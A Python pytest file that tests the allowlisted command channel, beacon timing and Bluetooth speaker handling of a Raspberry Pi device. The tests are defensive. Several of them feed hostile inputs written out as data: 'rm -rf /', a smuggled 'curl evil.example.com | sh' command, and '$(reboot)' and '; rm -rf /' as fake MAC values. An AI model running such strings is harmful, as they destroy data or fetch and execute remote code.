"""The allowlist is the only thing standing between this control channel and
remote code execution on a device in a locker room. Test it as such."""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import lockerroom.control as control  # noqa: E402


def test_unknown_command_is_refused_without_executing(monkeypatch):
    called = []
    monkeypatch.setattr(control.subprocess, "run", lambda *a, **k: called.append(a))

    ok, output = control._run("rm -rf /")

    assert ok is False
    assert "not an allowed command" in output
    assert called == [], "a command outside the allowlist must never reach subprocess"


def test_shell_metacharacters_do_not_smuggle_a_second_command(monkeypatch):
    called = []
    monkeypatch.setattr(control.subprocess, "run", lambda *a, **k: called.append(a))

    # Lookup is by exact key, so appending to a valid name does not match.
    ok, output = control._run("report-status; curl evil.example.com | sh")

    assert ok is False
    assert called == []


def test_allowed_command_runs_as_a_fixed_argv(monkeypatch):
    seen = {}

    class Result:
        returncode = 0
        stdout = "up 4 minutes"
        stderr = ""

    def fake_run(argv, **kwargs):
        seen["argv"] = argv
        return Result()

    monkeypatch.setattr(control.subprocess, "run", fake_run)

    ok, output = control._run("restart-listener")

    assert ok is True
    # A list, never a shell string - nothing here is parsed by a shell.
    assert seen["argv"] == ["sudo", "systemctl", "restart", "lockerroom-listener"]
    assert isinstance(seen["argv"], list)


def test_command_failure_is_reported_not_raised(monkeypatch):
    def boom(*a, **k):
        raise OSError("no such binary")

    monkeypatch.setattr(control.subprocess, "run", boom)

    ok, output = control._run("reboot")

    # A failing command must not kill the beacon loop - that would strand the
    # Pi with no way to receive the next command.
    assert ok is False
    assert "OSError" in output


# --------------------------------------------------------------------------- #
# Per-command timeouts. One slow command must not set the timeout for all of
# them: a 15s Bluetooth sweep plus a per-device info call each does not fit in
# the 25s that was fine for `uptime`.
# --------------------------------------------------------------------------- #

import pytest  # noqa: E402

from lockerroom import btscan, relaytarget  # noqa: E402


def _fake_run(seen, stdout="", rc=0):
    class Result:
        returncode = rc
        stderr = ""

    Result.stdout = stdout

    def run(argv, **kwargs):
        seen["argv"] = argv
        seen["timeout"] = kwargs.get("timeout")
        return Result()

    return run


def test_each_command_carries_its_own_timeout(monkeypatch):
    seen = {}
    monkeypatch.setattr(control.subprocess, "run", _fake_run(seen))
    control._run("report-status")
    quick = seen["timeout"]
    control._run("scan-speakers")
    assert seen["timeout"] > quick, "a Bluetooth sweep needs longer than uptime"


def test_the_scan_command_is_a_fixed_argv_with_no_arguments(monkeypatch):
    """The one thing that must stay true of every entry on this list. A scan
    takes no parameters, which is exactly why it can be a command at all —
    selecting a speaker is state, and travels on the beacon instead."""
    seen = {}
    monkeypatch.setattr(control.subprocess, "run", _fake_run(seen))
    control._run("scan-speakers")
    assert seen["argv"] == ["sudo", "/usr/local/bin/bt-scan.sh"]


def test_every_allowlisted_entry_is_an_argv_list_and_a_timeout():
    for name, (argv, timeout) in control.ALLOWED.items():
        assert isinstance(argv, list), f"{name} must be an argv list, not a shell string"
        assert all(isinstance(a, str) for a in argv), name
        assert isinstance(timeout, (int, float)) and timeout > 0, name


def test_no_allowlisted_command_interpolates_anything():
    """If a command ever needs a parameter, it does not belong on this list —
    see the speaker selection design. Nothing here may contain a placeholder."""
    for name, (argv, _) in control.ALLOWED.items():
        for arg in argv:
            assert "{" not in arg and "%s" not in arg, f"{name} looks parameterised"


# --------------------------------------------------------------------------- #
# Attentive mode: the beacon idles at 60s, which is longer than a speaker's
# pairing window. After a command it pays attention for a few minutes.
# --------------------------------------------------------------------------- #


class TestAttentive:
    def test_idle_uses_the_slow_interval(self):
        assert control.next_interval(None, playing=False, now=100.0) == control.IDLE_INTERVAL_S

    def test_playing_uses_the_active_interval(self):
        assert control.next_interval(None, playing=True, now=100.0) == control.ACTIVE_INTERVAL_S

    def test_inside_the_window_is_fast(self):
        assert control.next_interval(200.0, playing=False, now=100.0) == control.ATTENTIVE_INTERVAL_S

    def test_attentive_beats_active(self):
        """Someone is standing at the admin screen holding a speaker. That
        outranks the ten-second cadence a playing song would otherwise get."""
        assert control.next_interval(200.0, playing=True, now=100.0) == control.ATTENTIVE_INTERVAL_S

    def test_the_window_expires_back_to_idle(self):
        assert control.next_interval(100.0, playing=False, now=100.1) == control.IDLE_INTERVAL_S

    def test_a_command_opens_the_window(self):
        assert control.attentive_until(now=1000.0) == 1000.0 + control.ATTENTIVE_WINDOW_S


# --------------------------------------------------------------------------- #
# Reading what the audio arbiter actually selected.
# --------------------------------------------------------------------------- #


class TestReadOutput:
    def test_reads_the_kind_and_the_card(self, tmp_path):
        p = tmp_path / "audio-out"
        p.write_text("usb:Device\n")
        assert control.read_output(p) == {"kind": "usb", "card": "Device"}

    def test_a_relay_card_keeps_the_colons_in_its_mac(self, tmp_path):
        p = tmp_path / "audio-out"
        p.write_text("relay:78:66:F3:1C:9D:B6\n")
        assert control.read_output(p) == {
            "kind": "relay",
            "card": "78:66:F3:1C:9D:B6",
        }

    def test_a_missing_file_is_unknown_not_an_error(self, tmp_path):
        """The listener may beacon before audio-route.sh has ever run."""
        assert control.read_output(tmp_path / "nope") is None

    def test_garbage_is_unknown(self, tmp_path):
        p = tmp_path / "audio-out"
        p.write_text("nonsense\n")
        assert control.read_output(p) is None


# --------------------------------------------------------------------------- #
# Scanning is refused mid-song. Discovery shares one antenna with the phone's
# audio and the outbound relay; pressing Scan during a song must not stutter
# the room. Refused HERE, where the play state actually lives, not guessed at
# on the server.
# --------------------------------------------------------------------------- #


class FakeSessions:
    def __init__(self, open_play=None):
        self._open = open_play

    def open_play_state(self):
        return self._open

    def aux_state(self):
        return None


class TestScanRefusal:
    def test_refused_while_a_play_is_open(self):
        ok, msg = control.may_scan(FakeSessions({"id": "p1", "status": "playing"}))
        assert ok is False
        assert "playing" in msg.lower()

    def test_allowed_when_nothing_is_playing(self):
        assert control.may_scan(FakeSessions(None))[0] is True

    def test_allowed_when_there_are_no_sessions_at_all(self):
        assert control.may_scan(None)[0] is True

    def test_a_session_manager_that_raises_does_not_block_the_scan(self):
        """Failing open is right here: the cost of scanning during a song is a
        stutter, and the cost of never scanning is a feature that does not
        work. A broken read must not be the thing that decides."""

        class Boom:
            def open_play_state(self):
                raise RuntimeError("nope")

        assert control.may_scan(Boom())[0] is True


# --------------------------------------------------------------------------- #
# Applying the speaker the server chose.
# --------------------------------------------------------------------------- #


class FakeRelay:
    def __init__(self, target=None):
        self._target = target
        self.calls: list = []
        self.connected = False
        self.last_error = None

    @property
    def target(self):
        return self._target

    async def set_target(self, mac):
        self.calls.append(mac)
        self._target = mac
        self.connected = mac is not None
        return True


class TestApplyRelaySpeaker:
    @pytest.mark.asyncio
    async def test_a_mac_from_the_server_is_applied_and_cached(self, tmp_path):
        cache = tmp_path / "relay-target-mac"
        relay = FakeRelay()
        await control.apply_relay_speaker(
            relay, "78:66:f3:1c:9d:b6", cache_path=cache, configured=None
        )
        assert relay.calls == ["78:66:F3:1C:9D:B6"]
        assert relaytarget.read_cache(cache) == "78:66:F3:1C:9D:B6"

    @pytest.mark.asyncio
    async def test_an_explicit_clear_falls_back_to_wired_and_is_remembered(self, tmp_path):
        """It has to be remembered, or a reboot with no network would read
        config.toml and quietly turn the speaker back on."""
        cache = tmp_path / "relay-target-mac"
        relay = FakeRelay("78:66:F3:1C:9D:B6")
        await control.apply_relay_speaker(
            relay, "", cache_path=cache, configured="78:66:F3:1C:9D:B6"
        )
        assert relay.calls == [None]
        assert relaytarget.read_cache(cache) == ""

    @pytest.mark.asyncio
    async def test_no_opinion_from_the_server_changes_nothing(self, tmp_path):
        cache = tmp_path / "relay-target-mac"
        relay = FakeRelay("78:66:F3:1C:9D:B6")
        await control.apply_relay_speaker(
            relay, None, cache_path=cache, configured=None
        )
        assert relay.calls == []
        assert not cache.exists()

    @pytest.mark.asyncio
    async def test_the_same_mac_again_is_not_reapplied(self, tmp_path):
        cache = tmp_path / "relay-target-mac"
        relay = FakeRelay("78:66:F3:1C:9D:B6")
        await control.apply_relay_speaker(
            relay, "78:66:F3:1C:9D:B6", cache_path=cache, configured=None
        )
        assert relay.calls == []

    @pytest.mark.asyncio
    async def test_a_garbage_mac_is_refused_without_disturbing_the_live_one(self, tmp_path):
        """The server is not trusted to be the only gate — the same stance the
        command allowlist takes, and for the same reason."""
        cache = tmp_path / "relay-target-mac"
        relay = FakeRelay("78:66:F3:1C:9D:B6")
        await control.apply_relay_speaker(
            relay, "$(reboot)", cache_path=cache, configured=None
        )
        assert relay.calls == []
        assert relay.target == "78:66:F3:1C:9D:B6"
        assert not cache.exists()

    @pytest.mark.asyncio
    async def test_a_relay_that_raises_does_not_kill_the_beacon(self, tmp_path):
        class Boom(FakeRelay):
            async def set_target(self, mac):
                raise RuntimeError("bluetoothctl went missing")

        await control.apply_relay_speaker(
            Boom(), "78:66:F3:1C:9D:B6", cache_path=tmp_path / "c", configured=None
        )


# --------------------------------------------------------------------------- #
# The scan result becomes structured beacon payload, not a truncated string.
# --------------------------------------------------------------------------- #


def test_a_scan_result_is_parsed_into_devices_and_summarised(monkeypatch):
    line = "78:66:F3:1C:9D:B6\t0x240414\t-54\tJBL Charge 6"
    seen = {}
    monkeypatch.setattr(control.subprocess, "run", _fake_run(seen, stdout=line))

    ok, summary, devices = control.run_command("scan-speakers")

    assert ok is True
    assert devices == btscan.parse(line)
    assert "1 device" in summary, "the command history row needs to read sensibly"


def test_a_non_scan_command_returns_no_devices(monkeypatch):
    seen = {}
    monkeypatch.setattr(control.subprocess, "run", _fake_run(seen, stdout="up 4 minutes"))
    ok, summary, devices = control.run_command("report-status")
    assert devices is None
    assert summary == "up 4 minutes"


# --------------------------------------------------------------------------- #
# The beacon skips its wait when it has something to report — but ONLY when the
# last beacon actually got through. Skipping on a failed beacon turns a network
# outage into a tight loop that hammers a dead link with no sleep between
# tries, on a box whose whole job is to survive outages quietly.
# --------------------------------------------------------------------------- #


class TestReportPromptly:
    def test_reports_at_once_when_the_beacon_got_through(self):
        assert control.should_report_now(pending=True, beacon_ok=True) is True

    def test_waits_when_there_is_nothing_to_report(self):
        assert control.should_report_now(pending=False, beacon_ok=True) is False

    def test_backs_off_when_the_beacon_failed(self):
        """The result is still pending and will go up on the next attempt. What
        must not happen is retrying with no delay."""
        assert control.should_report_now(pending=True, beacon_ok=False) is False


# --------------------------------------------------------------------------- #
# The escape hatch: report-full and run-repair.
#
# Added 2026-09-21, after a fault on 2026-09-20 that took an hour to diagnose
# and could not be fixed remotely at all. The box was online, beaconing and
# taking commands; the adapter was UP RUNNING with no PSCAN/ISCAN, so no phone
# could see it. `report-status` checks three units, none of which were the
# broken ones, and no allowlisted command could restart the Bluetooth units.
#
# These two commands are the general escape hatch, and they are on the same
# allowlist as everything else — so the invariant tests above (argv lists, per
# entry timeouts, no interpolation) cover them automatically. That is the point
# of writing those tests as a loop over ALLOWED.
# --------------------------------------------------------------------------- #


class TestEscapeHatchAllowlist:
    def test_report_full_is_a_fixed_argv_with_no_arguments(self, monkeypatch):
        seen = {}
        monkeypatch.setattr(control.subprocess, "run", _fake_run(seen))
        control._run("report-full")
        assert seen["argv"] == ["sudo", "/usr/local/bin/report-full.sh"]

    def test_run_repair_is_a_fixed_argv_with_no_arguments(self, monkeypatch):
        """The thing that varies is the COMMIT you pushed, not an argument
        here. A parameterised repair command would be the shell this allowlist
        exists to not be."""
        seen = {}
        monkeypatch.setattr(control.subprocess, "run", _fake_run(seen))
        control._run("run-repair")
        assert seen["argv"] == ["sudo", "/usr/local/bin/run-repair.sh"]

    def test_a_repair_gets_longer_than_a_diagnostic_and_both_beat_uptime(self, monkeypatch):
        seen = {}
        monkeypatch.setattr(control.subprocess, "run", _fake_run(seen))
        control._run("report-status")
        status = seen["timeout"]
        control._run("report-full")
        report = seen["timeout"]
        control._run("run-repair")
        repair = seen["timeout"]
        assert report > status, "a dump shells out to audio-check.sh and nine journals"
        assert repair > report, "a repair pulls the repo and restarts eight units"

    def test_no_allowlisted_command_touches_the_listener_package(self):
        """The listener IS the control channel. Nothing reachable from a button
        on a web page may write to /opt/lockerroom/lockerroom — a mechanism
        that can replace the listener can destroy remote access while using it.
        run-repair.sh enforces this at runtime by snapshotting the package and
        restoring it; this asserts no argv goes near it in the first place."""
        for name, (argv, _) in control.ALLOWED.items():
            for arg in argv:
                assert "/opt/lockerroom/lockerroom" not in arg, name

    def test_both_new_commands_are_actually_on_the_allowlist(self):
        for name in control.REPORT_COMMANDS:
            assert name in control.ALLOWED, f"{name} reports but cannot run"


# --------------------------------------------------------------------------- #
# A dump is a document, not a line. It rides its own beacon payload into
# `pi_reports` rather than pi_commands.result, which the server cuts to 2000
# characters — the same split a scan makes, for the same reason.
# --------------------------------------------------------------------------- #


class TestReportPayload:
    def test_the_body_travels_whole_and_the_summary_stays_short(self):
        body = "AuxGoat full report\n" + ("x" * 5000)
        summary, report = control.report_payload("report-full", True, body)

        assert report is not None
        assert report["body"] == body, "the dump must arrive intact — that is the feature"
        assert report["kind"] == "report-full"
        assert report["ok"] is True
        assert len(summary) < 80, "the command history row is one line on a phone"
        assert len(summary[:2000]) == len(summary), "the summary must survive the cut"

    def test_a_failed_command_still_sends_its_body(self):
        """A repair that reported a problem is precisely the log worth reading,
        and the 2026-09-20 fault would have been diagnosed from a dump whose
        script exited non-zero."""
        summary, report = control.report_payload("run-repair", False, "restart failed")
        assert report is not None
        assert report["body"] == "restart failed"
        assert report["ok"] is False
        assert "problem" in summary

    def test_a_normal_command_is_left_completely_alone(self):
        summary, report = control.report_payload("report-status", True, "up 4 minutes")
        assert report is None
        assert summary == "up 4 minutes"

    def test_an_oversized_body_is_cut_but_never_silently(self):
        """Silent truncation is the exact failure this whole payload exists to
        stop repeating. A cut says so, in the body, where the person reading
        the dump on their phone will see it."""
        summary, report = control.report_payload(
            "report-full", True, "y" * (control.MAX_REPORT_CHARS + 5000)
        )
        assert report is not None
        assert len(report["body"]) <= control.MAX_REPORT_CHARS
        assert "REST IS MISSING" in report["body"]

    def test_no_output_at_all_is_said_rather_than_sent_as_empty(self):
        """An empty body would store as nothing and read on screen as though
        the command had never run."""
        _, report = control.report_payload("report-full", True, "")
        assert report is not None
        assert "no output" in report["body"]


# --------------------------------------------------------------------------- #
# Mid-song refusal, generalised from scanning.
# --------------------------------------------------------------------------- #


class TestMayRun:
    def test_a_repair_is_refused_while_a_song_is_playing(self):
        """A repair restarts bluetooth and every lockerroom unit, which cuts
        the music outright — worse than the stutter a scan causes."""
        ok, why = control.may_run(
            "run-repair", FakeSessions({"id": "p1", "status": "playing"})
        )
        assert ok is False
        assert "playing" in why.lower()

    def test_a_scan_is_still_refused_while_a_song_is_playing(self):
        ok, _ = control.may_run(
            "scan-speakers", FakeSessions({"id": "p1", "status": "playing"})
        )
        assert ok is False

    def test_a_read_only_report_is_allowed_mid_song(self):
        """report-full writes nothing and restarts nothing. The moment you most
        want to look at the box is usually the moment something is playing
        badly, so making a DJ stop first would be backwards."""
        ok, _ = control.may_run(
            "report-full", FakeSessions({"id": "p1", "status": "playing"})
        )
        assert ok is True

    def test_everything_is_allowed_when_nothing_is_playing(self):
        for name in control.ALLOWED:
            assert control.may_run(name, FakeSessions(None))[0] is True, name

    def test_a_broken_play_state_does_not_block_a_repair(self):
        """Fails open, the same way may_scan does: a broken read must not be
        the thing that stops someone fixing an unreachable box."""

        class Boom:
            def open_play_state(self):
                raise RuntimeError("nope")

        assert control.may_run("run-repair", Boom())[0] is True


# --------------------------------------------------------------------------- #
# forget-selected-phone.
#
# Bluetooth has no unpair message: forgetting is local and one-sided. When
# somebody forgets this box on their phone, iOS drops its link key and never
# tells us, so we keep a bond the phone no longer has — and BlueZ refuses the
# fresh Just Works re-pair (JustWorksRepairing defaults to `never`), locking
# that person out permanently. Clearing it needed a serial cable until now.
#
# WHICH device is state on the beacon, not an argument, so the invariant tests
# above still hold for this command — which is the point of writing them as a
# loop over ALLOWED.
# --------------------------------------------------------------------------- #

from lockerroom import forgettarget  # noqa: E402


class TestForgetSelectedPhone:
    def test_it_is_a_fixed_argv_with_no_arguments(self, monkeypatch):
        """The MAC does NOT appear here. If it ever does, the allowlist has
        grown a parameter and the property it exists to protect is gone."""
        seen = {}
        monkeypatch.setattr(control.subprocess, "run", _fake_run(seen))
        control._run("forget-selected-phone")
        assert seen["argv"] == ["sudo", "/usr/local/bin/bt-forget.sh"]

    def test_no_mac_can_reach_the_argv(self):
        for name, (argv, _) in control.ALLOWED.items():
            for arg in argv:
                assert ":" not in arg or arg.startswith("/"), (
                    f"{name} carries something MAC-shaped in its argv"
                )

    def test_it_is_allowed_mid_song(self):
        """Removing a bond touches no audio path. Someone locked out should not
        have to wait for a song to end to be let back in."""
        ok, _ = control.may_run(
            "forget-selected-phone", FakeSessions({"id": "p1", "status": "playing"})
        )
        assert ok is True


class TestForgetTargetFromServer:
    def test_a_mac_is_accepted_and_normalised(self):
        assert forgettarget.from_server("5c:ad:ba:f0:b2:61") == "5C:AD:BA:F0:B2:61"

    def test_junk_is_refused(self):
        """The server is not trusted to be the only gate — this value becomes a
        bluetoothctl argv element."""
        for bad in ("$(reboot)", "not-a-mac", "5C:AD:BA:F0:B2", "; rm -rf /", 42, None):
            assert forgettarget.from_server(bad) is None

    def test_empty_string_is_nothing_pending_not_a_state(self):
        """Unlike the relay speaker, "" means nothing here. There is no such
        thing as explicitly forgetting nothing, and treating it as a state
        would be a third case for every caller to get wrong."""
        assert forgettarget.from_server("") is None

    def test_write_then_read_round_trips(self, tmp_path):
        p = tmp_path / "forget-target"
        forgettarget.write("5C:AD:BA:F0:B2:61", path=p)
        assert forgettarget.read(p) == "5C:AD:BA:F0:B2:61"

    def test_none_clears_the_request(self, tmp_path):
        p = tmp_path / "forget-target"
        forgettarget.write("5C:AD:BA:F0:B2:61", path=p)
        forgettarget.write(None, path=p)
        assert not p.exists()
        assert forgettarget.read(p) is None

    def test_a_corrupt_file_reads_as_nothing_pending(self, tmp_path):
        """A half-written MAC would pass a naive length check and name the
        wrong device. Better to forget nothing than the wrong thing."""
        p = tmp_path / "forget-target"
        p.write_text("5C:AD:BA:F0")
        assert forgettarget.read(p) is None

    def test_the_target_lives_on_run_so_it_dies_at_reboot(self):
        """This is pending work, not configuration — the opposite of
        relaytarget, whose cache is on /var/lib precisely so it DOES survive.
        A forget request that outlived a power cut would fire days later at a
        phone somebody had since re-paired."""
        assert str(forgettarget.TARGET_PATH).startswith("/run/")
        assert not str(forgettarget.TARGET_PATH).startswith("/var/")
